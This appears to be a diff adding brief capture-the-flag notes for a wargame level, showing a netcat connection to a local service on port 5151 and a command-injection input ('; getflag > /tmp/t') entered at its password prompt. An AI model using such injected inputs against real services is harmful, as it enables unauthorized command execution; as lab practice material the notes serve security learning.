@@ -1,0 +1,9 @@
+cat level11.lua
+-> port 5151
+
+nc localhost 5151
+-> "password:"
+
+-> ; getflag > /tmp/t
+
+win
